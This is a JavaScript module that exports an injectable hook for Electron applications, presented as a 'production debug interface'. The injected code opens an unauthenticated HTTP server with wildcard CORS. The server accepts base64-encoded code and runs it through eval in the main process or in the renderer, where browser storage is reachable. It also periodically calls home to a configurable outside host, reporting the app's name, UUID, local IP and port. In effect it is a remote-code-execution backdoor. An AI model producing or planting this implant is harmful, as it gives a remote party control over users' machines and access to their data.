const hook = {
    name: 'Hook',
    description: 'Main hook for the application',
    target: 'main',
    code: `
  // Configuration - Edit these values as needed
  const CONFIG = {
      APP_UUID: '{{ APP_UUID }}',
      DEBUG_PORT: {{ DEBUG_PORT }},
      DEBUG_HOST: '{{ DEBUG_HOST }}',
      CALL_HOME_HOST: '{{ CALL_HOME_HOST }}',
      CALL_HOME_PORT: {{ CALL_HOME_PORT }},
      CALL_HOME_INTERVAL: {{ CALL_HOME_INTERVAL }},
      JOB_TIMEOUT: {{ JOB_TIMEOUT }}, //  timeout for jobs
      ENABLE_CALL_HOME: {{ ENABLE_CALL_HOME }}
  };
  
  console.log('[DEBUG-TOOL] Initializing production debug interface...');
  
  (function() {
      'use strict';
      
      // Prevent multiple instances
      if (global._debugToolLoaded) {
          console.log('[DEBUG-TOOL] Already loaded, skipping initialization');
          return;
      }
      global._debugToolLoaded = true;
      
      // Dependencies
      let electron, app, BrowserWindow, http, crypto;
      
      try {
          electron = require('electron');
          ({ app, BrowserWindow } = electron);
          http = require('http');
          crypto = require('crypto');
      } catch (error) {
          console.error('[DEBUG-TOOL] Failed to load required modules:', error.message);
          return;
      }
      
      // Job storage - results are deleted after retrieval
      const jobs = new Map();
      
      // Utility functions
      const utils = {
          generateJobId: () => crypto.randomBytes(8).toString('hex'),
          
          decodeBase64: (data) => {
              try {
                  return Buffer.from(data, 'base64').toString('utf-8');
              } catch (error) {
                  throw new Error(\`Invalid base64 data: \${error.message}\`);
              }
          },
          
          safeStringify: (obj) => {
              try {
                  return JSON.stringify(obj, null, 2);
              } catch (error) {
                  return \`[Serialization Error: \${error.message}]\`;
              }
          },
          
          logRequest: (method, path, jobId = null) => {
              const timestamp = new Date().toISOString();
              console.log(\`[DEBUG-TOOL] \${timestamp} \${method} \${path}\${jobId ? \` (Job: \${jobId})\` : ''}\`);
          }
      };
      
      // Store the actual debug port used by the server
      let actualDebugPort = CONFIG.DEBUG_PORT;
      
      // Job management
      const jobManager = {
          create: (code, process, timeout = CONFIG.JOB_TIMEOUT) => {
              const jobId = utils.generateJobId();
              const job = {
                  id: jobId,
                  code: code.substring(0, 100) + (code.length > 100 ? '...' : ''),
                  process,
                  status: 'pending',
                  created: Date.now(),
                  timeout: setTimeout(() => {
                      jobManager.setResult(jobId, {
                          status: 'timeout',
                          error: 'Job execution timed out',
                          completed: Date.now()
                      });
                  }, timeout)
              };
              
              jobs.set(jobId, job);
              return jobId;
          },
          
          setResult: (jobId, result) => {
              const job = jobs.get(jobId);
              if (job) {
                  // Clear timeout if it exists
                  if (job.timeout) {
                      clearTimeout(job.timeout);
                  }
                  
                  // Update job with result
                  Object.assign(job, result, {
                      completed: Date.now()
                  });
                  
                  console.log(\`[DEBUG-TOOL] Job \${jobId} completed with status: \${result.status}\`);
              }
          },
          
          getAndDelete: (jobId) => {
              const job = jobs.get(jobId);
              if (job) {
                  jobs.delete(jobId);
                  // Clear timeout if still pending
                  if (job.timeout) {
                      clearTimeout(job.timeout);
                  }
              }
              return job;
          },
          
          cleanup: () => {
              const now = Date.now();
              let cleaned = 0;
              
              for (const [id, job] of jobs.entries()) {
                  // Remove jobs older than 5 minutes
                  if (now - job.created > 300000) {
                      if (job.timeout) {
                          clearTimeout(job.timeout);
                      }
                      jobs.delete(id);
                      cleaned++;
                  }
              }
              
              if (cleaned > 0) {
                  console.log(\`[DEBUG-TOOL] Cleaned up \${cleaned} old jobs\`);
              }
          }
      };
      
      // Code execution handlers
      const executors = {
          main: async (code, jobId) => {
              try {
                  console.log(\`[DEBUG-TOOL] Executing in main process (Job: \${jobId})\`);
                  
                  // Create a safe execution context
                  const result = await (async function() {
                      // Provide useful context in main process
                      const debugContext = {
                          app,
                          BrowserWindow,
                          windows: BrowserWindow.getAllWindows(),
                          versions: process.versions,
                          platform: process.platform
                      };
                      
                      // Make context available in execution
                      return await eval(\`(async function() { 
                          const { app, BrowserWindow, windows, versions, platform } = arguments[0];
                          \${code}
                      })\`)(debugContext);
                  })();
                  
                  jobManager.setResult(jobId, {
                      status: 'completed',
                      result: result,
                      process: 'main'
                  });
                  
              } catch (error) {
                  jobManager.setResult(jobId, {
                      status: 'error',
                      error: error.message,
                      stack: error.stack,
                      process: 'main'
                  });
              }
          },
          
          renderer: async (code, jobId) => {
              try {
                  console.log(\`[DEBUG-TOOL] Executing in renderer process (Job: \${jobId})\`);
                  
                  const windows = BrowserWindow.getAllWindows();
                  const activeWindow = windows.find(w => w.isFocused()) || windows[0];
                  
                  if (!activeWindow || !activeWindow.webContents) {
                      throw new Error('No active window with webContents available');
                  }
                  
                  // Execute in renderer with error handling
                  const result = await activeWindow.webContents.executeJavaScript(\`
                      (async function() {
                          try {
                              // Provide useful debugging context
                              const debugContext = {
                                  location: window.location,
                                  document: document,
                                  localStorage: localStorage,
                                  sessionStorage: sessionStorage,
                                  navigator: navigator
                              };
                              
                              // Execute user code with context
                              return await (async function() {
                                  \${code}
                              })();
                          } catch (error) {
                              return {
                                  __error: true,
                                  message: error.message,
                                  stack: error.stack,
                                  name: error.name
                              };
                          }
                      })();
                  \`);
                  
                  // Check if renderer returned an error
                  if (result && result.__error) {
                      throw new Error(\`Renderer error: \${result.message}\`);
                  }
                  
                  jobManager.setResult(jobId, {
                      status: 'completed',
                      result: result,
                      process: 'renderer',
                      windowId: activeWindow.id
                  });
                  
              } catch (error) {
                  jobManager.setResult(jobId, {
                      status: 'error',
                      error: error.message,
                      stack: error.stack,
                      process: 'renderer'
                  });
              }
          }
      };
      
      // App info collector
      const getAppInfo = () => {
          try {
              const windows = BrowserWindow.getAllWindows();
              
              return {
                  app: {
                      name: app.getName(),
                      version: app.getVersion(),
                      isPackaged: app.isPackaged,
                      appPath: app.getAppPath(),
                      userDataPath: app.getPath('userData')
                  },
                  system: {
                      platform: process.platform,
                      arch: process.arch,
                      versions: process.versions,
                      pid: process.pid,
                      uptime: Math.round(process.uptime())
                  },
                  windows: windows.map(win => ({
                      id: win.id,
                      title: win.getTitle(),
                      url: win.webContents?.getURL() || 'Unknown',
                      visible: win.isVisible(),
                      focused: win.isFocused(),
                      bounds: win.getBounds()
                  })),
                  debug: {
                      activeJobs: jobs.size,
                      toolVersion: '2.0',
                      startTime: Date.now()
                  }
              };
          } catch (error) {
              return {
                  error: 'Failed to collect app info',
                  message: error.message
              };
          }
      };
      
      // Call home functionality
      const callHome = () => {
          if (!CONFIG.ENABLE_CALL_HOME) {
              console.log('[DEBUG-TOOL] Call home disabled in config');
              return;
          }
          
          try {
              // Get local IP address
              let ip = '127.0.0.1';
              try {
                  const os = require('os');
                  const nets = os.networkInterfaces();
                  for (const name of Object.keys(nets)) {
                      for (const net of nets[name]) {
                          if (net.family === 'IPv4' && !net.internal) {
                              ip = net.address;
                              break;
                          }
                      }
                  }
              } catch (e) {
                  // fallback to 127.0.0.1
              }

              const postData = utils.safeStringify({
                  app_name: app.getName(),
                  uuid: CONFIG.APP_UUID,
                  timestamp: Date.now(),
                  active_jobs: jobs.size,
                  port: actualDebugPort,
                  ip: ip
              });
              
              const options = {
                  hostname: CONFIG.CALL_HOME_HOST,
                  port: CONFIG.CALL_HOME_PORT,
                  path: '/call-home',
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json',
                      'Content-Length': Buffer.byteLength(postData)
                  },
                  timeout: 5000
              };
              
              console.log(\`[DEBUG-TOOL] Attempting call home to \${CONFIG.CALL_HOME_HOST}:\${CONFIG.CALL_HOME_PORT}\`);
              
              const req = http.request(options, (res) => {
                  let responseData = '';
                  
                  res.on('data', (chunk) => {
                      responseData += chunk;
                  });
                  
                  res.on('end', () => {
                      if (res.statusCode === 200) {
                          console.log('[DEBUG-TOOL] Call home successful');
                      } else {
                          console.log(\`[DEBUG-TOOL] Call home failed with status: \${res.statusCode}\`);
                          if (responseData) {
                              console.log(\`[DEBUG-TOOL] Response: \${responseData}\`);
                          }
                      }
                  });
              });
              
              req.on('error', (error) => {
                  console.log(\`[DEBUG-TOOL] Call home error: \${error.message}\`);
                  if (error.code === 'ECONNREFUSED') {
                      console.log(\`[DEBUG-TOOL] Is the call-home server running on \${CONFIG.CALL_HOME_HOST}:\${CONFIG.CALL_HOME_PORT}?\`);
                  }
              });
              
              req.on('timeout', () => {
                  console.log('[DEBUG-TOOL] Call home timed out');
                  req.destroy();
              });
              
              req.write(postData);
              req.end();
              
          } catch (error) {
              console.log(\`[DEBUG-TOOL] Call home exception: \${error.message}\`);
          }
      };
      
      // HTTP server setup
      const createServer = () => {
          const server = http.createServer(async (req, res) => {
              // Set CORS headers
              res.setHeader('Access-Control-Allow-Origin', '*');
              res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
              res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
              res.setHeader('Content-Type', 'application/json');
              
              // Handle preflight
              if (req.method === 'OPTIONS') {
                  res.writeHead(200);
                  res.end();
                  return;
              }
              
              try {
                  const url = new URL(req.url, \`http://\${CONFIG.DEBUG_HOST}:\${CONFIG.DEBUG_PORT}\`);
                  const path = url.pathname;
                  
                  // Route: GET /info
                  if (req.method === 'GET' && path === '/info') {
                      utils.logRequest('GET', '/info');
                      
                      const info = getAppInfo();
                      res.writeHead(200);
                      res.end(utils.safeStringify(info));
                  }
                  
                  // Route: POST /console
                  else if (req.method === 'POST' && path === '/console') {
                      let body = '';
                      
                      req.on('data', chunk => {
                          body += chunk.toString();
                      });
                      
                      req.on('end', async () => {
                          try {
                              const payload = JSON.parse(body);
                              
                              // Validate payload
                              if (!payload.data || !payload.process) {
                                  res.writeHead(400);
                                  res.end(utils.safeStringify({
                                      error: 'Missing required fields: data, process'
                                  }));
                                  return;
                              }
                              
                              if (!['main', 'renderer'].includes(payload.process)) {
                                  res.writeHead(400);
                                  res.end(utils.safeStringify({
                                      error: 'Process must be "main" or "renderer"'
                                  }));
                                  return;
                              }
                              
                              // Decode and create job
                              const code = utils.decodeBase64(payload.data);
                              const jobId = jobManager.create(code, payload.process);
                              
                              utils.logRequest('POST', '/console', jobId);
                              
                              // Return job ID immediately
                              res.writeHead(200);
                              res.end(utils.safeStringify({
                                  jobId,
                                  status: 'pending',
                                  process: payload.process
                              }));
                              
                              // Execute in background
                              setImmediate(() => {
                                  executors[payload.process](code, jobId);
                              });
                              
                          } catch (error) {
                              res.writeHead(400);
                              res.end(utils.safeStringify({
                                  error: error.message
                              }));
                          }
                      });
                  }
                  
                  // Route: GET /result/:jobId
                  else if (req.method === 'GET' && path.match(/^\\/result\\/[a-f0-9]+$/)) {
                      const jobId = path.split('/')[2];
                      utils.logRequest('GET', \`/result/\${jobId}\`, jobId);
                      
                      const job = jobManager.getAndDelete(jobId);
                      
                      if (!job) {
                          res.writeHead(404);
                          res.end(utils.safeStringify({
                              error: 'Job not found or already retrieved'
                          }));
                          return;
                      }
                      
                      res.writeHead(200);
                      res.end(utils.safeStringify({
                          jobId: job.id,
                          status: job.status,
                          process: job.process,
                          created: job.created,
                          completed: job.completed || null,
                          result: job.result || null,
                          error: job.error || null,
                          stack: job.stack || null,
                          windowId: job.windowId || null
                      }));
                  }
                  
                  // Route: Unknown
                  else {
                      res.writeHead(404);
                      res.end(utils.safeStringify({
                          error: 'Not found',
                          availableRoutes: [
                              'GET /info',
                              'POST /console',
                              'GET /result/:jobId'
                          ]
                      }));
                  }
                  
              } catch (error) {
                  console.error('[DEBUG-TOOL] Request error:', error);
                  res.writeHead(500);
                  res.end(utils.safeStringify({
                      error: 'Internal server error'
                  }));
              }
          });
          
          return server;
      };
      
      // Initialize the debug tool
      const initialize = () => {
          try {
              const server = createServer();
              
              server.listen(CONFIG.DEBUG_PORT, CONFIG.DEBUG_HOST, () => {
                  actualDebugPort = server.address().port;
                  console.log(\`[DEBUG-TOOL] Server listening on http://\${CONFIG.DEBUG_HOST}:\${actualDebugPort}\`);
                  console.log(\`[DEBUG-TOOL] Available endpoints:\`);
                  console.log(\`[DEBUG-TOOL]   GET  /info - Application information\`);
                  console.log(\`[DEBUG-TOOL]   POST /console - Execute code (data: base64, process: main|renderer)\`);
                  console.log(\`[DEBUG-TOOL]   GET  /result/:jobId - Retrieve execution results\`);
              });
              
              server.on('error', (error) => {
                  console.error('[DEBUG-TOOL] Server error:', error);
              });
              
              // Set up periodic cleanup
              setInterval(jobManager.cleanup, 60000); // Every minute
              
              // Set up call home if enabled
              if (CONFIG.ENABLE_CALL_HOME) {
                  setInterval(callHome, CONFIG.CALL_HOME_INTERVAL);
                  setTimeout(callHome, 5000); // Initial call after 5 seconds
              }
              
              console.log('[DEBUG-TOOL] Initialization complete');
              
          } catch (error) {
              console.error('[DEBUG-TOOL] Initialization failed:', error);
          }
      };
      
      // Start when app is ready
      if (app.isReady()) {
          initialize();
      } else {
          app.once('ready', () => {
              setTimeout(initialize, 1000);
          });
      }
      
  })();
  `
  };

export default hook;